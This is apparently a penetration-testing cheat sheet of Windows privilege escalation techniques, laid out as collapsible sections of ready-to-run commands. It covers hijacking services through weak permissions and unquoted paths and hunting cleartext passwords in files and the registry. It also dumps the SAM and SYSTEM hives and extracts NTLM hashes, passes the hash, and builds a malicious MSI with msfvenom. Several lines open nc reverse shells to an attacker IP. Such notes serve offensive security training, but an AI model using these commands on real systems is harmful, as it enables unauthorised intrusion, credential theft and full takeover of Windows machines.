#####################################
Windows Privilege Escalation Examples
#####################################

<details>
<summary>Weak Service Permissions</summary>
 <br> 
========================

Writable Service Executables
----------------------------

If a services is found which runs as SYSTEM or Administrator level users, and it has weak file permissions, we may be able to replace the service binary, restart the service, and escalate privileges.

Use wmic to extract a list of service executables:

.. code-block:: none

    for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\services.txt

If wmic is not available:

.. code-block:: none

    sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
    FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

Then use either accesschk.exe, cacls, or icacls to list the access permissions associated with each service executable:

.. code-block:: none

    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c accesschk.exe /accepteula -qv "%a" >> accesschk.txt

    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c cacls "%a" >> cacls.txt

    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\services.txt) do cmd.exe /c icacls "%a" >> icacls.txt

With accesschk results, look for the following permissions:

.. csv-table::
    :header: "Permission", "Use Case"

    "SERVICE_ALL_ACCESS", "Can do anything."
    "SERVICE_CHANGE_CONFIG", "Can reconfigure the service binary."
    "WRITE DAC", "Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG."
    "WRITE_OWNER", "Can become owner, reconfigure permissions."
    "GENERIC_WRITE", "Inherits SERVICE_CHANGE_CONFIG"
    "GENERIC_ALL", "Inherits SERVICE_CHANGE_CONFIG"

With cacls and icacls, look for (F)ull Access, (M)odify access, (W)rite-only access, (WDAC) write DAC, or (WO) write owner.

Writable Service Objects
------------------------

Use accesschk.exe to find writable service objects:

.. code-block:: none

    accesschk.exe /accepteula -uwcqv "Authenticated Users" *

Query a vulnerable service:

.. code-block:: none

    sc qc <service>

Update the service binary path:

.. code-block:: none

    sc config <service> binpath= "<command>"

Update the name of the account which a service runs as:

.. code-block:: none

    sc config upnphost obj= ".\LocalSystem" password= ""

Stop / Start a service:

.. code-block:: none

    wmic service <service> call stopservice
    wmic service <service> call startservice

    net stop <service>
    net start <service>

    sc stop <service>
    sc start <service>

If the service fails to start because of a dependency, you can start the dependency manually, or remove the dependency:

.. code-block:: none

    sc config <service> depend= ""

All-in-one comnand:

.. code-block:: none

    sc config <service> binPath= "<command>" depend= "" start= demand obj= ".\LocalSystem" password= ""
</details>

<details>
<summary>SeBackupPrivilege</summary>
 <br> 
This specific privilege escalation is based on the act of assigning a user the SeBackupPrivilege. It was designed to allow users to create backup copies of the system. Since it is not possible to make a backup of something that you cannot read. This privilege comes at the cost of providing the user with full read access to the file system. This privilege must bypass any ACL that the Administrator has placed in the network. So, in a nutshell, this privilege allows the user to read any file on the entirety of the files that might also include some sensitive files.

Files like the SAM file or the SYSTEM registry file are particularly valuable to attackers. Once an attacker gains an initial foothold in the system, they can exploit this access to move up to an elevated shell. They do this by reading the SAM files and potentially cracking the passwords of high-privilege users on the system or network.

After connecting to the target machine using Evil-WinRM, we can check if the user we logged in has the SeBackupPrivilege. This can be done with the help of the whoami command with the /priv option. It can be observed from the image below that the user aarti has the SeBackupPrivilege.

    whoami /priv



## Exploiting Privilege on Windows
Now, we can start the exploitation of this privilege. As we discussed earlier that this privilege allows the user to read all the files in the system, we will use this to our advantage. To begin, we will traverse to the C:\ directory and then move to create a Temp directory. We can also traverse to a directory with read and write privileges if the attacker is trying to be sneaky. Then we change the directory to Temp. Here we use our SeBackupPrivilege to read the SAM file and save a variant of it. Similarly, we read the SYSTEM file and save a variant of it.

     cd c:\
     mkdir Temp
     reg save hklm\sam c:\Temp\sam
     reg save hklm\system c:\Temp\system

  

Transferring Files to Kali Linux
Now that the Temp directory contains the SAM and SYSTEM files, use the Evil-WinRM download command to transfer these files to your Kali Linux machine.

    cd Temp
    download sam
    download system
## Extracting Hashes with Pypykatz and Gaining Access
Now, we can extract the hive secrets from the SAM and SYSTEM files using the pypykatz. If not present on your Kali Linux, you can download it from its GitHub[https://github.com/skelsec/pypykatz]. It is a variant of Mimikatz cooked in Python. So, we can run its registry function and then use the –sam parameter to provide the path to the SAM and SYSTEM files. As soon as the command run, we can see in the demonstration below that we have successfully extracted the NTLM hashes of the Administrator account and other users as well.

    pypykatz registry --sam sam system

Now, we can use the NTLM Hash of the raj user to get access to the target machine as a raj user. We again used Evil-WinRM to do this. After connecting to the target machine, we run net user to see that raj user is a part of the Administrator group. This means we have successfully elevated privilege over our initial shell as the aarti user.

 </details>
<details>
<summary>Unquoted Service Pathss</summary>
 <br> 

----------------------

Find unquoted service paths:

.. code-block:: none

    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, you can place a binary in any of the following paths:

.. code-block:: none

    C:\Program.exe
    C:\Program Files.exe
    C:\Program Files\path.exe
    C:\Program Files\path to.exe
    C:\Program Files\path to\service.exe

</details>
<details>
<summary>Cleartext Passwords</summary>
 <br> 

===================

Find passwords in arbitrary files:

.. code-block:: none

    findstr /si password *.txt *.xml *.ini

Find strings in filenames:

.. code-block:: none

    dir /s *pass* == *cred* == *vnc* == *.config*

Find passwords in all files:

.. code-block:: none

    findstr /spin "password" *.*

Common files which contain passwords:

.. code-block:: none

    type c:\sysprep.inf
    type c:\sysprep\sysprep.xml
    type c:\unattend.xml
    type %WINDIR%\Panther\Unattend\Unattended.xml
    type %WINDIR%\Panther\Unattended.xml
    dir c:*vnc.ini /s /b
    dir c:*ultravnc.ini /s /b
    dir c:\ /s /b | findstr /si *vnc.ini

Search for passwords in the registry:

.. code-block:: none

    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

</details>
<details>
<summary>Passing the Hash</summary>
 <br> 
================

The following commands can be used to dump password hashes:

.. code-block:: none

    wce32.exe -w
    wce64.exe -w
    fgdump.exe

Remote
------

Pass the hash remotely to gain a shell:

.. code-block:: none

    pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd

Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):

.. code-block:: none

    pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd

Alternative:

.. code-block:: none

    export SMBHASH=<hash>
    pth-winexe -U <domain>/<username>% //<target-ip> cmd

Local
-----

Pass the hash locally using runas:

.. code-block:: none

    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"

Pass the hash locally using PowerShell:

.. code-block:: none

    secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
    mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
    computer = "<hostname>"
    [System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)

Pass the hash locally using psexec:

.. code-block:: none

    psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"

</details>
<details>
<summary>Loopback Services</summary>
 <br> 
=================

Search for services listening on the loopback interface:

.. code-block:: none

    netstat -ano | findstr "LISTEN"

Use plink.exe to forward the loopback port to a port on our attacking host (via SSH):

.. code-block:: none

    plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>

</details>
<details>
<summary>AlwaysInstallElevated</summary>
 <br> 
=====================

AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

Both the following registry values must be set to "1" for this to work:

.. code-block:: none

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Create a malicious MSI:

.. code-block:: none

    msfvenom -p windows/adduser USER=pwned PASS=P@ssw0rd -f msi -o evil.msi

Use msiexec to run the malicious MSI:

.. code-block:: none

    msiexec /quiet /qn /i C:\evil.msi

</details>
<details>
<summary>Stored Credentials</summary>
 <br> 

==================

If there are stored credentials, we can run commands as that user:

.. code-block:: none

    $ cmdkey /list

    Currently stored credentials:

    Target: Domain:interactive=PWNED\Administrator
    Type: Domain Password
    User: PWNED\Administrator

Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:

.. code-block:: none


    runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"

   </details>
